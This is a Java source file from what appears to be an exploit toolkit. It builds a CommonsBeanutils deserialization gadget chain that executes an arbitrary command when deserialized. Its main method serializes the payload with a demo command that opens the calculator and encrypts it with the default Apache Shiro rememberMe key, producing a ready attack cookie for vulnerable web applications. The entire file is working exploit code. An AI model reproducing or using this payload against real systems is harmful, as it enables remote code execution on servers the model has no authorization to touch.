package core.payload;


import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import core.util.Util;
import org.apache.commons.beanutils.BeanComparator;

import java.util.PriorityQueue;

/**
 * Based on CommonsBeanUtils
 * Version: 1.8.3
 */
public class NoCC implements ObjectPayload{
    @Override
    public Object getObjectPayload(String command) {
        Util util = new Util();
        TemplatesImpl templates = util.createTemplates(command);
        BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        PriorityQueue<Object> priorityQueue = new PriorityQueue<>(2, comparator);
        // Add String element : ClassCastException[java.lang.Integer cannot be cast to java.lang.String]
        priorityQueue.add("1");
        priorityQueue.add("2");
        util.setFieldValue(comparator, "property", "outputProperties");
        util.setFieldValue(priorityQueue, "queue", new Object[]{templates, templates});

        return priorityQueue;
    }

    public static void main(String[] args) {
        Util util = new Util();
        byte[] bytes = util.serialize(new NoCC().getObjectPayload("open -a Calculator"));
        System.out.println(util.getRememberMe(bytes, "kPH+bIxk5D2deZiIxcaaaA=="));
    }
}
